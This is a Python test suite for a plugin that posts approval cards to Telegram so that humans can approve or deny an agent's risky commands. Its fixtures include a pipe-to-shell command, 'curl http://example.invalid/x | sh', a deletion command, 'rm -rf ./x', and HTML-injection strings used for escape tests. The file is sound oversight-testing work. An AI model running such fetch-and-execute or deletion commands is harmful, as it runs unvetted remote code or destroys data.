"""No Telegram traffic: native-shaped adapter, PTB handler and callback fakes."""
import asyncio
import json
from pathlib import Path
import re
import tempfile
import time
import threading
from types import SimpleNamespace as NS
import unittest
from unittest.mock import patch

from project_sessions.registry import Registry
from project_sessions.telegram_approvals import PATTERN, TelegramApprovals, render_approval_card

ROOT = Path(__file__).resolve().parents[1]
from hermes_env import HERMES_SOURCE, requires_hermes


class Handler:
    def __init__(self, callback, pattern):
        self.callback, self.pattern = callback, re.compile(pattern)


class Bot:
    id = 777

    def __init__(self):
        self.messages = []
        self.edits = []
        self.fail = False

    async def edit_message_text(self, **kwargs):
        if self.fail:
            raise RuntimeError('Fake network failure')
        self.edits.append(kwargs)

    async def send_document(self, **kwargs):
        payload = kwargs.pop('document').getvalue()
        caption = kwargs.pop('caption')
        return await self.send_message(document_bytes=payload, text=caption, **kwargs)

    async def send_message(self, **kwargs):
        if self.fail:
            raise RuntimeError('Fake network failure')
        self.messages.append(kwargs)
        return NS(message_id=len(self.messages))


class App:
    def __init__(self):
        self.bot = Bot()
        self.handlers = []

    def add_handler(self, handler):
        self.handlers.append(handler)

    def remove_handler(self, handler):
        self.handlers.remove(handler)


class Adapter:
    def __init__(self, home):
        self.home = home
        self.allowed = True
        self.current_session = 'initial-session'
        async def lookup(route):
            return NS(session_id=self.current_session)
        self.gateway_runner = NS(async_session_store=NS(lookup_by_session_key=lookup))

    def build_source(self, **kwargs):
        return NS(**kwargs, profile_route_rejected=False)

    def _canonicalize(self, source):
        return NS(runtime_home=self.home)

    def _source_session_key(self, source):
        return f'agent:main:telegram:{source.chat_type}:{source.chat_id}:{source.thread_id}'

    def _is_sender_authorized(self, user_id, chat_type, chat_id, **kwargs):
        return self.allowed if user_id in ('42', '43') else False

    # Mirrors of the Telegram adapter's normalizers (contract-checked against the
    # installed adapter in NativeHostContracts).
    @staticmethod
    def _chat_type_str(chat):
        return str(getattr(chat, 'type', '')).split('.')[-1].lower() if chat else ''

    @classmethod
    def _effective_message_thread_id(cls, message):
        kind = cls._chat_type_str(message.chat)
        raw = message.message_thread_id
        topic = bool(getattr(message, 'is_topic_message', False))
        group = kind in ('group', 'supergroup')
        forum = group and getattr(message.chat, 'is_forum', False) is True
        if raw is not None:
            return str(raw) if forum or (group and topic) or (kind == 'private' and topic) else None
        return '1' if forum else None

    @staticmethod
    def _message_thread_id_for_send(thread_id):
        return None if not thread_id or str(thread_id) == '1' else int(thread_id)


class Query:
    def __init__(self, data, message_id, *, user_id=42, chat_id=-100, thread_id=8, chat=None):
        self.data = data
        self.id = 'callback-1'
        self.from_user = NS(id=user_id, is_bot=False)
        # Default: a forum-topic message, as Telegram delivers it to PTB.
        self.message = NS(message_id=message_id, chat_id=chat_id, message_thread_id=thread_id,
                          is_topic_message=thread_id is not None and chat is None,
                          chat=chat or NS(type='supergroup', is_forum=True))
        self.answers, self.edits = [], []
        self.edit_fails = False
        self.markup_edits = []

    async def answer(self, **kwargs):
        self.answers.append(kwargs)

    async def edit_message_reply_markup(self, **kwargs):
        self.markup_edits.append(kwargs)

    async def edit_message_text(self, **kwargs):
        if self.edit_fails:
            raise RuntimeError('Fake edit failure')
        self.edits.append(kwargs)


class TelegramApprovalTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        (ROOT / 'scratch').mkdir(exist_ok=True)
        self.tmp = tempfile.TemporaryDirectory(dir=ROOT / 'scratch')
        self.base = Path(self.tmp.name)
        self.project = self.base / 'repo'
        self.project.mkdir()
        self.home = self.base / 'home'
        self.reg = Registry(self.base / 'registry.db', self.home)
        # Hermes admits forum-topic messages as chat_type "group" (adapter _build_message_event).
        self.origin = {'platform': 'telegram', 'chat_id': '-100', 'chat_type': 'group', 'user_id': '42', 'thread_id': '8'}
        self.route = 'agent:main:telegram:group:-100:8'
        self.reg.remember_route(self.route, self.origin)
        self.pid = self.reg.ensure_project(self.route, 'initial-session')['id']
        wid = self.reg.create_workstream(self.pid, 'test scope', self.route, self.project)['workstream_id']
        self.reg.submit(self.pid, wid, 'task', 'test task', 'criteria', 'scope', self.route)
        self.task = self.reg.claim()
        self.aid = self.reg.request_approval(self.task['run_id'], 'curl http://example.invalid/x | sh', 'dangerous pipeline', 600)
        sdk = NS(InlineKeyboardButton=lambda text, **kw: NS(text=text, **kw), InlineKeyboardMarkup=lambda rows: NS(inline_keyboard=rows))
        self.patcher = patch.dict('sys.modules', {'telegram': sdk, 'telegram.ext': NS(CallbackQueryHandler=Handler)})
        self.patcher.start()
        self.app, self.adapter = App(), Adapter(self.home)
        self.permission = True
        self.buttons = TelegramApprovals(self.reg, lambda: self.permission)
        self.buttons.install(self.app, self.adapter)

    async def asyncTearDown(self):
        self.buttons.close()
        await asyncio.sleep(0)
        self.patcher.stop()
        self.tmp.cleanup()

    async def send(self):
        self.assertTrue(await self.buttons.deliver_one())
        return self.app.bot.messages[-1]['reply_markup'].inline_keyboard[0]

    async def press(self, data, **kwargs):
        query = Query(data, len(self.app.bot.messages), **kwargs)
        await self.app.handlers[0].callback(NS(callback_query=query), NS())
        return query

    def request(self):
        return self.reg.inspect(self.pid, self.route)['approval_requests'][0]

    async def test_compact_card_buttons_and_summary(self):
        buttons = await self.send()
        self.assertEqual([b.text for b in buttons], ['Approve', 'Deny'])
        for button in buttons:
            self.assertRegex(button.callback_data, PATTERN)
            self.assertLessEqual(len(button.callback_data.encode()), 64)
        self.assertFalse(self.app.handlers[0].pattern.match('ea:once:1'))
        self.assertFalse(self.app.handlers[0].pattern.match('approve ' + self.aid))
        text = '\n'.join(m['text'] for m in self.app.bot.messages)
        for value in ('test task', 'test scope', 'curl http://example.invalid/x | sh', 'dangerous pipeline'):
            self.assertIn(value, text)
        self.assertEqual(len(self.app.bot.messages), 1)
        self.assertEqual(self.app.bot.messages[0]['parse_mode'], 'HTML')
        for hidden in (self.aid, self.pid, self.task['workstream_id'], 'initial-session', self.task['run_id']):
            self.assertNotIn(hidden, text)
        self.assertTrue(all(m['chat_id'] == '-100' and m['message_thread_id'] == 8 for m in self.app.bot.messages))
        self.assertNotIn(buttons[0].callback_data, json.dumps(self.reg.index(self.pid, self.route)))

    async def test_long_unicode_action_is_one_bounded_card(self):
        action = 'printf ' + '😀' * 12000 + ' end'
        with self.reg.connection() as db:
            db.execute('UPDATE approval_requests SET command=? WHERE id=?', (action, self.aid))
            db.execute('UPDATE tasks SET input=? WHERE id=?', ('Long task ' * 1000, self.task['id']))
        buttons = await self.send()
        self.assertEqual(len(self.app.bot.messages), 1)
        card = self.app.bot.messages[0]
        self.assertNotIn('document_bytes', card)
        self.assertNotIn(action, card['text'])
        self.assertIn('<pre>printf ', card['text'])
        self.assertIn('Command truncated', card['text'])
        self.assertLess(len(card['text'].encode('utf-16-le')) // 2, 3500)
        query = Query(buttons[0].callback_data, 1)
        query.edit_fails = True
        await self.app.handlers[0].callback(NS(callback_query=query), NS())
        self.assertEqual(query.markup_edits, [{'reply_markup': None}])
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')

    async def test_approve_single_use_and_replay_cannot_change_vote(self):
        buttons = await self.send()
        query = await self.press(buttons[0].callback_data)
        self.assertIn('Approved once', query.edits[0]['text'])
        self.assertEqual(query.edits[0]['parse_mode'], 'HTML')
        self.assertIn('<pre>curl ', query.edits[0]['text'])
        self.assertNotIn(self.aid, query.edits[0]['text'])
        self.assertIsNone(query.edits[0]['reply_markup'])
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')
        await self.press(buttons[1].callback_data)
        self.assertEqual(self.request()['decision'], 'once')
        self.assertEqual(self.reg.poll_approval(self.aid), 'deny')
        self.assertEqual(self.reg.inspect(self.pid, self.route)['runs'][0]['state'], 'running')

    async def test_admitted_shared_route_member_refreshes_recovery_actor(self):
        buttons = await self.send()
        self.adapter._is_sender_authorized = lambda user_id, *a, **kw: user_id == '43'
        await self.press(buttons[0].callback_data, user_id=43)
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')
        self.assertEqual(self.reg.route_origin(self.route)['user_id'], '43')

    async def test_deny(self):
        buttons = await self.send()
        query = await self.press(buttons[1].callback_data)
        self.assertIn('Denied', query.edits[0]['text'])
        self.assertEqual(self.reg.poll_approval(self.aid), 'deny')

    async def test_unknown_unauthorized_bot_and_revoked_permission(self):
        buttons = await self.send()
        for auth in (False, None, 'yes'):
            self.adapter.allowed = auth
            query = await self.press(buttons[0].callback_data)
            self.assertFalse(query.edits)
            self.assertIsNone(self.request()['user_vote'])
        self.adapter.allowed = True
        query = Query(buttons[0].callback_data, len(self.app.bot.messages))
        query.from_user.is_bot = True
        await self.app.handlers[0].callback(NS(callback_query=query), NS())
        self.assertIsNone(self.request()['user_vote'])
        self.permission = False
        await self.press(buttons[0].callback_data)
        self.assertIsNone(self.request()['user_vote'])

    async def test_wrong_chat_thread_message_bot_or_profile(self):
        buttons = await self.send()
        for kwargs in ({'chat_id': -101}, {'thread_id': 9}):
            query = await self.press(buttons[0].callback_data, **kwargs)
            self.assertFalse(query.edits)
        query = Query(buttons[0].callback_data, 999)
        await self.app.handlers[0].callback(NS(callback_query=query), NS())
        self.app.bot.id = 778
        await self.press(buttons[0].callback_data)
        self.app.bot.id = 777
        self.adapter.home = self.base / 'other-profile'
        await self.press(buttons[0].callback_data)
        self.assertIsNone(self.request()['user_vote'])

    async def test_agent_text_and_forged_token_not_votes(self):
        buttons = await self.send()
        self.assertFalse(self.reg.capture_approval_vote(self.route, 'text', buttons[0].callback_data))
        self.assertFalse(self.reg.capture_approval_vote(self.route, 'text', 'approve everything'))
        query = await self.press('psa:a:' + self.aid)
        self.assertFalse(query.edits)
        self.assertIsNone(self.request()['user_vote'])

    async def test_expired_and_cancelled_cards_never_claim_approval(self):
        buttons = await self.send()
        with self.reg.connection() as db:
            db.execute('UPDATE approval_requests SET deadline=? WHERE id=?', (time.time() - 1, self.aid))
        query = await self.press(buttons[0].callback_data)
        self.assertIn('Expired', query.edits[0]['text'])
        self.assertIsNone(self.request()['user_vote'])
        self.reg.cancel(self.pid, self.task['id'], self.route)
        await self.press(buttons[0].callback_data)
        self.assertEqual(self.request()['decision'], 'deny')

    async def test_edit_failure_reply_does_not_undo_consent(self):
        buttons = await self.send()
        query = Query(buttons[0].callback_data, len(self.app.bot.messages))
        query.edit_fails = True
        await self.app.handlers[0].callback(NS(callback_query=query), NS())
        self.assertIn('Approved once', self.app.bot.messages[-1]['text'])
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')

    async def test_rewired_native_application_uses_newest_connection(self):
        self.app.bot.fail = True
        replacement = App()
        self.buttons.install(replacement, self.adapter)
        self.app = replacement
        await self.send()
        self.assertEqual(len(replacement.bot.messages), 1)
        # The rebuilt Application supersedes the adapter's dead one.
        self.assertEqual([c[0] for c in self.buttons.connections], [replacement])

    async def test_buttons_survive_restart_without_admission_or_resend(self):
        buttons = await self.send()
        self.buttons.close()
        await asyncio.sleep(0)
        reg = Registry(self.reg.path, self.home)
        self.assertEqual(reg.route_origin(self.route), self.origin)
        self.buttons = TelegramApprovals(reg, lambda: True)
        self.buttons.install(self.app, self.adapter)
        self.assertFalse(await self.buttons.deliver_one())
        await self.press(buttons[0].callback_data)
        self.assertEqual(reg.poll_approval(self.aid), 'once')

    async def test_unsent_card_recovered_after_restart_and_send_failure_backoff(self):
        self.buttons.close()
        await asyncio.sleep(0)
        reg = Registry(self.reg.path, self.home)
        self.buttons = TelegramApprovals(reg, lambda: True)
        self.buttons.install(self.app, self.adapter)
        self.app.bot.fail = True
        with self.assertRaises(RuntimeError):
            await self.buttons.deliver_one()
        with reg.connection() as db:
            row = db.execute('SELECT * FROM approval_cards').fetchone()
            self.assertEqual(row['attempts'], 1)
            self.assertGreater(row['next_attempt'], time.time())
            db.execute('UPDATE approval_cards SET next_attempt=0')
        self.app.bot.fail = False
        await self.send()
        self.assertEqual(self.request()['state'], 'pending')

    async def rebind(self, origin):
        # A fresh registry bound to a different admitted route of the same chat.
        self.buttons.close()
        await asyncio.sleep(0)
        self.reg = Registry(self.base / 'other.db', self.home)
        self.route = self.adapter._source_session_key(NS(**origin))
        self.reg.remember_route(self.route, dict(origin, platform='telegram'))
        self.pid = self.reg.ensure_project(self.route, 'session')['id']
        wid = self.reg.create_workstream(self.pid, 'scope', self.route, self.project)['workstream_id']
        self.reg.submit(self.pid, wid, 'task', 'test task', 'criteria', 'scope', self.route)
        self.task = self.reg.claim()
        self.aid = self.reg.request_approval(self.task['run_id'], 'rm -rf ./x', 'dangerous', 600)
        self.app = App()
        self.buttons = TelegramApprovals(self.reg, lambda: True)
        self.buttons.install(self.app, self.adapter)

    async def test_forum_general_topic_card_is_sendable_and_pressable(self):
        await self.rebind({'chat_id': '-100', 'chat_type': 'group', 'user_id': '42', 'thread_id': '1'})
        buttons = await self.send()
        self.assertTrue(all(m['message_thread_id'] is None for m in self.app.bot.messages))
        # Telegram delivers General-topic messages without a thread id.
        query = await self.press(buttons[0].callback_data, thread_id=None)
        self.assertIn('Approved once', query.edits[0]['text'])
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')

    async def test_plain_group_reply_anchor_is_not_a_route(self):
        await self.rebind({'chat_id': '-100', 'chat_type': 'group', 'user_id': '42', 'thread_id': None})
        buttons = await self.send()
        query = await self.press(buttons[0].callback_data, thread_id=77, chat=NS(type='group'))
        self.assertIn('Approved once', query.edits[0]['text'])

    async def test_simultaneous_choices_have_one_winner(self):
        buttons = await self.send()
        queries = [Query(b.callback_data, len(self.app.bot.messages)) for b in buttons]
        await asyncio.gather(*(self.app.handlers[0].callback(NS(callback_query=q), NS()) for q in queries))
        self.assertEqual(self.request()['decision'], 'once')
        self.assertEqual(self.reg.poll_approval(self.aid), 'once')
        self.assertIn('Already approved once', queries[1].answers[0]['text'])

    async def test_legacy_origin_recovered_from_host_store_without_admission(self):
        with self.reg.connection() as db:
            db.execute('DELETE FROM main_routes')
        looked_up = []
        async def lookup(key):
            looked_up.append(key)
            return NS(origin=NS(to_dict=lambda: self.origin))
        self.adapter.gateway_runner = NS(async_session_store=NS(lookup_by_session_key=lookup))
        await self.send()
        self.assertEqual(looked_up, [self.route])
        self.assertEqual(self.reg.route_origin(self.route), self.origin)

    async def test_legacy_wrong_native_route_not_adopted(self):
        with self.reg.connection() as db:
            db.execute('DELETE FROM main_routes')
        async def lookup(key):
            return NS(origin=NS(to_dict=lambda: dict(self.origin, thread_id='9')))
        self.adapter.gateway_runner = NS(async_session_store=NS(lookup_by_session_key=lookup))
        self.assertFalse(await self.buttons.deliver_one())
        self.assertIsNone(self.reg.route_origin(self.route))
        self.assertFalse(self.app.bot.messages)

    async def test_origin_is_immutable_and_only_bound_origins_are_recovered(self):
        self.assertIsNone(self.reg.route_origin('unknown'))
        with self.assertRaises(ValueError):
            self.reg.remember_route(self.route, dict(self.origin, thread_id='9'))
        with self.assertRaises(ValueError):
            self.reg.remember_route('other', dict(self.origin, platform='discord'))
        self.assertEqual(self.reg.route_origin(self.route), self.origin)

    async def dispatch_event(self):
        # Keep this test loop ticking: restricted runners can suppress socketpair
        # wakeups, including asyncio.to_thread completion and executor shutdown.
        outcome = []
        def dispatch():
            try:
                outcome.append(self.reg.dispatch(self.buttons.send_event))
            except Exception as exc:
                outcome.append(exc)
        thread = threading.Thread(target=dispatch)
        thread.start()
        deadline = time.monotonic() + 12
        while thread.is_alive() and time.monotonic() < deadline:
            await asyncio.sleep(.01)
        self.assertFalse(thread.is_alive(), 'Delivery thread did not finish')
        thread.join(timeout=0)
        if isinstance(outcome[0], Exception):
            raise outcome[0]
        return outcome[0]

    def injection_host(self, session_id='initial-session', accepted=True):
        calls = []
        async def lookup(route):
            self.assertEqual(route, self.route)
            return NS(session_id=session_id)
        self.adapter.gateway_runner = NS(async_session_store=NS(lookup_by_session_key=lookup))
        self.buttons.inject = lambda content, **kw: calls.append((content,kw)) or accepted
        return calls

    async def test_approval_request_is_card_only_and_waits_for_delivery(self):
        calls=self.injection_host()
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(self.app.bot.messages,[])
        await self.send()
        count=len(self.app.bot.messages)
        with self.reg.connection() as db:
            db.execute('UPDATE outbox SET next_attempt=0')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(len(self.app.bot.messages),count)
        self.assertEqual(calls,[])
        self.assertFalse(await self.dispatch_event())

    async def test_current_approval_outcome_short_injection_without_duplicate_notice(self):
        calls=self.injection_host()
        buttons=await self.send()
        count=len(self.app.bot.messages)
        await self.press(buttons[0].callback_data)
        self.assertEqual(self.reg.poll_approval(self.aid),'once')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(len(self.app.bot.messages),count)
        self.assertEqual(len(calls),1)
        text,kwargs=calls[0]
        self.assertIn(self.aid,text)
        self.assertIn('once (consumed)',text)
        self.assertNotIn('curl',text)
        self.assertNotIn('dangerous pipeline',text)
        self.assertLess(len(text),700)
        self.assertEqual(kwargs,{'role':'system','origin':self.origin})
        self.assertFalse(await self.dispatch_event())

    async def test_old_approval_outcome_with_card_has_no_notice_or_injection(self):
        calls=self.injection_host('after-new')
        self.reg.ensure_project(self.route,'after-new')
        buttons=await self.send()
        count=len(self.app.bot.messages)
        await self.press(buttons[1].callback_data)
        self.assertEqual(self.reg.poll_approval(self.aid),'deny')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(calls,[])
        self.assertEqual(len(self.app.bot.messages),count)
        self.assertIn('test scope',self.app.bot.messages[0]['text'])
        self.assertNotIn('initial-session',self.app.bot.messages[0]['text'])

    async def test_typed_outcome_edits_sent_card(self):
        calls=self.injection_host()
        await self.send()
        count=len(self.app.bot.messages)
        self.reg.capture_approval_vote(self.route,'human','approve '+self.aid)
        self.reg.decide_approval(self.pid,self.aid,'once',self.route)
        self.assertEqual(self.reg.poll_approval(self.aid),'once')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(len(calls),1)
        self.assertEqual(len(self.app.bot.messages),count)
        edit,=self.app.bot.edits
        self.assertEqual((edit['chat_id'],edit['message_id'],edit['parse_mode']),('-100',count,'HTML'))
        self.assertIsNone(edit['reply_markup'])
        self.assertIn('Approved once',edit['text'])
        self.assertIn('<pre>curl ',edit['text'])
        self.assertNotIn('Expires:',edit['text'])

    async def test_timeout_outcome_edits_old_card_and_edit_failure_is_harmless(self):
        calls=self.injection_host('after-new')
        self.reg.ensure_project(self.route,'after-new')
        await self.send()
        with self.reg.connection() as db:
            db.execute('UPDATE approval_requests SET deadline=0 WHERE id=?',(self.aid,))
        self.assertEqual(self.reg.poll_approval(self.aid),'deny')
        self.app.bot.fail=True
        self.assertTrue(await self.dispatch_event())
        self.assertEqual((calls,self.app.bot.edits),([],[]))
        with self.reg.connection() as db:
            db.execute("UPDATE outbox SET state='pending',accepted=NULL,next_attempt=0 WHERE kind='approval_resolved'")
        self.app.bot.fail=False
        self.assertTrue(await self.dispatch_event())
        self.assertIn('Expired',self.app.bot.edits[0]['text'])
        self.assertIsNone(self.app.bot.edits[0]['reply_markup'])

    async def test_button_outcome_is_not_edited_twice(self):
        self.injection_host()
        buttons=await self.send()
        await self.press(buttons[1].callback_data)
        self.assertEqual(self.reg.poll_approval(self.aid),'deny')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(self.app.bot.edits,[])

    async def test_old_approval_outcome_without_card_is_labelled_short_fallback(self):
        calls=self.injection_host('after-new')
        self.reg.capture_approval_vote(self.route,'human','deny '+self.aid)
        self.reg.decide_approval(self.pid,self.aid,'deny',self.route)
        self.assertEqual(self.reg.poll_approval(self.aid),'deny')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(calls,[])
        self.assertEqual(len(self.app.bot.messages),1)
        text=self.app.bot.messages[0]['text']
        self.assertIn('initial-session',text)
        self.assertIn('deny',text)
        self.assertNotIn('curl',text)

    async def test_old_archive_notice_labels_originating_conversation(self):
        calls=self.injection_host('after-new')
        self.reg.finish(self.task['run_id'],'completed')
        self.assertTrue(await self.dispatch_event())
        with self.reg.connection() as db:
            db.execute('UPDATE workstreams SET idle_since=0')
        self.assertEqual(self.reg.sweep_archives(),1)
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(self.app.bot.messages[-1]['text'],'Conversation initial-session: Archived 1 idle subsession: test scope')
        self.assertEqual(calls,[])
        self.assertFalse(await self.dispatch_event())

    async def test_current_completion_injects_summary_card_ids_once(self):
        calls=self.injection_host()
        self.reg.finish(self.task['run_id'],'completed',result='Useful result summary')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(self.app.bot.messages,[])
        content,kw=calls[0]
        payload=json.loads(content.split('\n',1)[1])
        self.assertEqual(payload['payload']['result_summary'],'Useful result summary')
        self.assertIn('card_update',payload['payload'])
        self.assertEqual(payload['project_id'],self.pid)
        self.assertEqual(payload['task_id'],self.task['id'])
        self.assertEqual(kw,{'role':'system','origin':self.origin})
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(len(calls),1)

    async def test_old_completion_never_injected(self):
        calls=self.injection_host('after-new')
        self.reg.ensure_project(self.route,'after-new')
        self.reg.finish(self.task['run_id'],'completed',result='Old result')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(calls,[])
        self.assertIn('initial-session',self.app.bot.messages[-1]['text'])

    async def test_compression_proof_injects_but_reset_and_fork_do_not(self):
        import sqlite3
        self.home.mkdir(exist_ok=True)
        with sqlite3.connect(self.home/'state.db') as db:
            db.execute('CREATE TABLE sessions(id TEXT,parent_session_id TEXT,end_reason TEXT,model_config TEXT)')
            db.executemany('INSERT INTO sessions VALUES(?,?,?,?)',[
                ('initial-session',None,'compression','{}'),('compressed','initial-session','new_session','{}'),
                ('reset','compressed',None,'{}'),('fork','initial-session',None,'{"_branched_from":"initial-session"}')])
        self.assertTrue(self.reg.is_current_conversation(self.pid,self.route,'compressed'))
        self.assertFalse(self.reg.is_current_conversation(self.pid,self.route,'reset'))
        self.assertFalse(self.reg.is_current_conversation(self.pid,self.route,'fork'))
        calls=self.injection_host('compressed')
        self.reg.finish(self.task['run_id'],'completed',result='result')
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(len(calls),1)
        self.assertEqual(self.app.bot.messages,[])

    async def test_failed_injection_retries_only_until_accepted(self):
        calls=self.injection_host(accepted=False)
        self.reg.finish(self.task['run_id'],'completed',result='result')
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(self.app.bot.messages,[])
        self.assertFalse(await self.dispatch_event())  # backoff
        self.assertEqual(len(calls),1)
        with self.reg.connection() as db:
            db.execute('UPDATE outbox SET next_attempt=0')
        accepted=self.injection_host(accepted=True)
        self.assertTrue(await self.dispatch_event())
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(len(accepted),1)

    async def test_unknown_current_session_keeps_result_pending(self):
        calls=self.injection_host(None)
        self.reg.finish(self.task['run_id'],'completed',result='result')
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(calls,[])
        self.assertEqual(self.app.bot.messages,[])
        event=self.reg.inspect(self.pid,self.route)['events'][-1]
        self.assertEqual(event['state'],'pending')

    async def test_archive_notice_is_one_plain_line_even_current(self):
        calls=self.injection_host()
        self.reg.finish(self.task['run_id'],'completed')
        # Consume earlier completion first.
        self.assertTrue(await self.dispatch_event())
        with self.reg.connection() as db:
            db.execute('UPDATE workstreams SET idle_since=0')
        self.assertEqual(self.reg.sweep_archives(),1)
        self.assertTrue(await self.dispatch_event())
        self.assertEqual(len(calls),1)
        self.assertEqual(self.app.bot.messages[-1]['text'],'Archived 1 idle subsession: test scope')
        self.assertFalse(await self.dispatch_event())

    async def test_old_completion_is_plain_visible_not_new_context(self):
        self.reg.finish(self.task['run_id'], 'completed', result='Old result')
        new = self.reg.ensure_project(self.route, 'after-new')['id']
        self.adapter.current_session = 'after-new'
        self.assertNotEqual(new, self.pid)
        # Outbox normally runs in a delivery thread; exercise that bridge on the live fake loop.
        self.assertTrue(await self.dispatch_event())
        message = self.app.bot.messages[-1]
        self.assertIn('initial-session', message['text'])
        self.assertIn(self.pid, message['text'])
        self.assertNotIn('after-new', message['text'])
        self.assertEqual(self.reg.inspect(new, self.route)['events'], [])
        self.assertEqual(self.reg.inspect(self.pid, self.route)['events'][-1]['state'], 'accepted')
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(len(self.app.bot.messages), 1)

    async def test_plain_event_recovery_and_authorization(self):
        self.reg.finish(self.task['run_id'], 'completed', result='done')
        self.buttons.registry = Registry(self.reg.path, self.home)
        self.adapter.allowed = False
        self.assertFalse(await self.dispatch_event())
        self.assertEqual(self.app.bot.messages, [])
        self.adapter.allowed = True
        with self.reg.connection() as db:
            db.execute('UPDATE outbox SET next_attempt=0')
        self.assertTrue(await self.dispatch_event())
        self.assertIn('initial-session', self.app.bot.messages[-1]['text'])



class NativeHostContracts(unittest.TestCase):
    @requires_hermes
    def test_installed_hermes_factory_and_origin_injection_contracts(self):
        import os
        import subprocess
        source = HERMES_SOURCE
        (ROOT / 'scratch').mkdir(exist_ok=True)
        with tempfile.TemporaryDirectory(dir=ROOT / 'scratch') as directory:
            script = r"""
import os,sys
from pathlib import Path
from types import SimpleNamespace as NS
sys.path.insert(0,sys.argv[1])
from hermes_cli.plugins import PluginManager,PluginContext,PluginManifest
from hermes_cli.plugins_injection import inject_plugin_message
from gateway.run_plugin_injection import GatewayPluginInjectionMixin
from gateway.config import Platform
manager=PluginManager()
ctx=PluginContext(PluginManifest(name='project-sessions'),manager)
factory=lambda app,adapter:None
ctx.register_telegram_handler(factory)
assert manager.get_telegram_handler_factories()==[(factory,'project-sessions')]
origin={'platform':'telegram','chat_id':'-100','chat_type':'forum','thread_id':'8','user_id':'42'}
calls=[]
home=Path(os.environ['HERMES_HOME'])
# The real injection function binds origin scheduling to the plugin's immutable
# profile home, and must not route a Telegram origin into the local CLI queue.
fake=NS(_manager=NS(_cli_ref=object(),has_gateway_message_injector=True,home_path=home,
                    inject_gateway_message=lambda **kw:calls.append(kw) or True),
        _gateway_injection_allowed=lambda:True,plugin_id='project-sessions')
assert inject_plugin_message(fake,'test','system',session_key=None,origin=origin)
assert calls[0]['origin']==origin and calls[0]['plugin_home']==home
class Adapter: pass
adapter=Adapter()
class Host(GatewayPluginInjectionMixin):
    def _served_profile_for_home(self,value):
        return 'bound-profile' if value==home else None
    def _adapters_for_profile(self,profile):
        return {Platform.TELEGRAM:adapter}
    def _canonicalize(self,source):
        return NS(runtime_profile='bound-profile')
host=Host()
restored=host._plugin_origin_source(origin,plugin_home=home,plugin_id='project-sessions')
assert restored.chat_id=='-100' and restored.thread_id=='8' and restored.user_id=='42'
assert host._plugin_origin_source(dict(origin,profile='other'),plugin_home=home,plugin_id='project-sessions') is None
assert host._plugin_origin_source(origin,plugin_home=home/'other',plugin_id='project-sessions') is None
# The callback mirrors these adapter normalizers to rebuild the admitted session key.
from plugins.platforms.telegram.adapter import TelegramAdapter as T
forum=NS(type='supergroup',is_forum=True)
assert T._chat_type_str(forum)=='supergroup'
assert T._effective_message_thread_id(NS(chat=forum,message_thread_id=8,is_topic_message=True))=='8'
assert T._effective_message_thread_id(NS(chat=forum,message_thread_id=None,is_topic_message=False))=='1'
assert T._effective_message_thread_id(NS(chat=NS(type='group'),message_thread_id=77,is_topic_message=False)) is None
assert T._message_thread_id_for_send('1') is None and T._message_thread_id_for_send('8')==8
import inspect
assert '"group" if telegram_chat_type in {"group", "supergroup"}' in inspect.getsource(T._build_message_event)
assert 'self._effective_message_thread_id(message)' in inspect.getsource(T._build_message_event)
"""
            env = {k:v for k,v in os.environ.items() if not k.startswith('HERMES_')}
            env.update(HERMES_HOME=str(Path(directory) / 'home'), PYTHONDONTWRITEBYTECODE='1')
            result = subprocess.run([str(source / 'venv/bin/python'), '-c', script, str(source)],
                                    env=env, cwd=ROOT, capture_output=True, text=True, timeout=30)
            self.assertEqual(result.returncode, 0, result.stderr)


class ApprovalRendering(unittest.TestCase):
    def card(self, **changes):
        card = dict(name='Research', task='Summarize findings', command='echo ok',
                    reason='Network access', deadline=1782948300,
                    project_id='project-secret', conversation='conversation-secret',
                    task_id='task-secret', run_id='run-secret')
        card.update(changes)
        return card

    def test_escape_all_fields_and_fold_lines(self):
        text = render_approval_card(self.card(name='<b> &', task='task\n<a> &',
            command='</pre><a href="x">&\x00', reason='why\n<i> &'))
        self.assertIn('&lt;b&gt; &amp;', text)
        self.assertIn('task &lt;a&gt; &amp;', text)
        self.assertIn('&lt;/pre&gt;&lt;a href="x"&gt;&amp;', text)
        self.assertIn('why &lt;i&gt; &amp;', text)
        self.assertNotIn('<a', text)
        self.assertNotIn('\x00', text)
        self.assertEqual(text.count('<pre>'), 1)
        self.assertEqual(text.count('</pre>'), 1)

    def test_worst_case_expansion_and_private_context(self):
        task = '&' * 2000 + 'FULL TASK TAIL'
        text = render_approval_card(self.card(name='&' * 1000, task=task,
            command='&' * 12000, reason='&' * 1000))
        self.assertLess(len(text.encode('utf-16-le')) // 2, 3500)
        for hidden in (task, 'FULL TASK TAIL', 'project-secret', 'conversation-secret',
                       'task-secret', 'run-secret', 'approve '):
            self.assertNotIn(hidden, text)
        self.assertIn('Command truncated', text)

    def test_profile_local_expiry_and_outcome(self):
        from datetime import datetime, timezone
        from zoneinfo import ZoneInfo
        card = self.card(deadline=datetime(2026, 7, 1, 23, 25, tzinfo=timezone.utc).timestamp())
        zone = ZoneInfo('America/Indiana/Indianapolis')
        text = render_approval_card(card, timezone=zone)
        self.assertIn('19:25 EDT — unanswered means deny', text)
        self.assertNotIn('2026-', text)
        outcome = render_approval_card(card, timezone=zone, outcome='Denied')
        self.assertIn('<b>Denied · Research</b>', outcome)
        self.assertNotIn('Expires:', outcome)

    def test_host_local_expiry_fallback(self):
        from datetime import datetime
        card = self.card()
        expected = datetime.fromtimestamp(card['deadline']).astimezone().strftime('%H:%M %Z')
